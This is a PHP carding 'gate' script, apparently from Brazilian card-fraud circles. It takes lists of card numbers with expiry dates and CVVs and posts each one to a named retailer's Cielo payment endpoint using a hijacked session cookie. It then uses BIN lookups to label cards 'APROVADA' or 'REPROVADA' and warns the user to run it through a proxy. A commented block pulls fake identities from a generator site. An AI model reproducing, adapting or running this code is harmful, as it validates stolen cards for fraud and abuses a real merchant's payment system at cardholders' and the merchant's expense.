<?php
error_reporting(0);
set_time_limit(0);

DeletarCookies();
if ($_SERVER['REQUEST_METHOD'] == "POST") {
    extract($_POST);
} elseif ($_SERVER['REQUEST_METHOD'] == "GET") {
    extract($_GET);
}

function deletarCookies() {
    if (file_exists("cookie.txt")) {
        unlink("cookie.txt");
    }
}
function multiexplode ($delimiters,$string){
    $ready = str_replace($delimiters, $delimiters[0], $string);
    $launch = explode($delimiters[0], $ready);
    return  $launch;}

function getStr2($string, $start, $end) {
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}
extract($_GET);
$lista = $_GET['lista'];
$lista = str_replace(" ", "", $lista);
$separadores = array(",","|",":","'"," ","~","Â»");
$explode = multiexplode($separadores,$lista);
$cc = $explode[0];
$mes = $explode[1];
$ano = $explode[2];
$cvv = $explode[3];


$number1 = substr($cc,0,4);
$number2 = substr($cc,4,4);
$number3 = substr($cc,8,4);
$number4 = substr($cc,12,4);

/*if($ano == 2019){  //QUANDO O ANO DO GATE NÃƒO TIVER 20, USE ESSA FUNÃ‡ÃƒO '.$ano1.'
$ano1 = "19";
}else if($ano == 2020){
$ano1 = "20";
}else if($ano == 2021){
$ano1 = "21";
}else if($ano == 2022){
$ano1 = "22";
}else if($ano == 2023){
$ano1 = "23";
}else if($ano == 2024){
$ano1 = "24";
}else if($ano == 2025){
$ano1 = "25";
}else if($ano == 2026){
$ano1 = "26";
}else if($ano == 2027){
$ano1 = "27";
}else if($ano == 2028){
$ano1 = "28";
}else if($ano == 2029){
$ano1 = "29";
}else if($ano == 2030){
$ano1 = "30";
}else if($ano == 2031){
$ano1 = "31";
}else{
    '<div class="background"><div class="diebox">';
    "<boxlive>#Erro ðŸ˜­</boxlive><boxlive2> Validade Invalida</boxlive2> @RodAbravanel";
    '</div></div>';
    exit();
}*/

/*if($cc[0]==4){ //QUANDO VOCÃŠ NÃƒO QUISER QUE TESTE UMA TAL GERADA NO GATE
'<div class="background"><div class="diebox">';
    "<boxlive>#Erro ðŸ˜­</boxlive><boxlive2> VocÃª nÃ£o pode testar essa gerada nesse gate, teste no GATE[1]</boxlive2> @RodAbravanel";
    '</div></div>';
    exit();
}else if($cc[0]==5){
    '<div class="background"><div class="diebox">';
    "<boxlive>#Erro ðŸ˜­</boxlive><boxlive2> VocÃª nÃ£o pode testar essa gerada nesse gate, teste no GATE[1]</boxlive2> @RodAbravanel";
    '</div></div>';
    exit();
}else if($cc[0]==3){
    '<div class="background"><div class="diebox">';
    "<boxlive>#Erro ðŸ˜­</boxlive><boxlive2> VocÃª nÃ£o pode testar essa gerada nesse gate, teste no GATE[1]</boxlive2> @RodAbravanel";
    '</div></div>';
    exit();
}else if($cc[0]==2){
    '<div class="background"><div class="diebox">';
    "<boxlive>#Erro ðŸ˜­</boxlive><boxlive2> VocÃª nÃ£o pode testar essa gerada nesse gate, teste no GATE[1]</boxlive2> @RodAbravanel";
    '</div></div>';
    exit();
}else if($cc[0]==1){
     '<div class="background"><div class="diebox">';
    "<boxlive>#Erro ðŸ˜­</boxlive><boxlive2> VocÃª nÃ£o pode testar essa gerada nesse gate, teste no GATE[1]</boxlive2> @RodAbravanel";
    '</div></div>';
    exit();
}*/

function value($str,$find_start,$find_end)
{
    $start = @strpos($str,$find_start);
    if ($start === false) 
    {
        return "";
    }
    $length = strlen($find_start);
    $end    = strpos(substr($str,$start +$length),$find_end);
    return trim(substr($str,$start +$length,$end));
}

function mod($dividendo,$divisor)
{
    return round($dividendo - (floor($dividendo/$divisor)*$divisor));
}

//=========================================//4 DEVS PHP//=========================================//
/*$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://www.4devs.com.br/ferramentas_online.php");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_ENCODING, "gzip");
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'acao=gerar_pessoa&sexo=I&pontuacao=S&idade=0&cep_estado=&txt_qtde=1&cep_cidade=');
$dados = curl_exec($ch);

$dados1 = json_decode($dados, true);

$name = $dados1["nome"];
$cpf = $dados1["cpf"];
$cep = $dados1["cep"];
$endereco = $dados1["endereco"];
$celular = $dados1["celular"];
$email = mt_rand();*/

//=========================================//PEGAR AS REQUEST DO TOKEN DO SITE//=========================================//

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.campagnaro.com.br/apicielo/processa_cartao.php');
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 0);
curl_setopt($ch, CURLOPT_LOW_SPEED_LIMIT, 0);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.91 Safari/537.36');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_ENCODING, "gzip");
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: www.campagnaro.com.br',
'accept: application/json, text/javascript, */*; q=0.01',
'origin: https://www.campagnaro.com.br',
'x-requested-with: XMLHttpRequest',
'user-agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.91 Safari/537.36',
'content-type: application/x-www-form-urlencoded; charset=UTF-8',
'referer: https://www.campagnaro.com.br/pedido/101654',
'cookie: _ga=GA1.3.1193546515.1592292561;_gid=GA1.3.893769978.1592292561;_fbp=fb.2.1592292562601.1190917712;PHPSESSID=0dd962be383993c63d2261cf79264802',
'accept-language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
));
curl_setopt($ch, CURLOPT_POSTFIELDS, 'cc-flag=visa&valor=271.90&pedido=101654&cc-number='.$cc.'&cc-cvv=000&mes='.$mes.'&ano='.$ano.'&parcelas=1');
echo $retorn = curl_exec($ch);
 
$bin = substr($cc, 0, 6);
$file = 'bins.csv';
$searchfor = $bin;
$contents = file_get_contents($file);
$pattern = preg_quote($searchfor, '/');
$pattern = "/^.*$pattern.*\$/m";
if (preg_match_all($pattern, $contents, $matches)) {
$encontrada = implode("\n", $matches[0]);
}
$pieces = explode(";", $encontrada);
$c = count($pieces);
if ($c == 8) {
$pais = $pieces[4];
$paiscode = $pieces[5];
$banco = $pieces[2];
$level = $pieces[3];
$bandeira = $pieces[1];
} else {
$pais = $pieces[5];
$paiscode = $pieces[6];
$level = $pieces[4];
$banco = $pieces[2];
$bandeira = $pieces[1];
}



if (strpos($retorn, 'GD') !== false) {
echo "REPROVADA $lista $bandeira $banco $level $pais $paiscode  #Retorno: GD #fredo.app";

}elseif (strpos($retorn, '05') !== false) {
echo "REPROVADA $lista $bandeira $banco $level $pais $paiscode Retorno: 05 #fredo.app";


}elseif (strpos($retorn, '57') !== false) {
echo "REPROVADA $lista $bandeira $banco $level $pais $paiscode Retorno: 57 #fredo.app";

}elseif (strpos($retorn, '14') !== false) {
echo "REPROVADA $lista $bandeira $banco $level $pais $paiscode Retorno: 14 #fredo.app";

}elseif (strpos($retorn, 'N7') !== false) {
echo "APROVADA $lista $bandeira $banco $level $pais $paiscode Retorno: N7 #fredo.app";


 }else {
echo "REPROVADA $lista $bandeira $banco $level $pais $paiscode Retorno Queima a Gate não, tá sem proxy. #fredo.app";

}

?>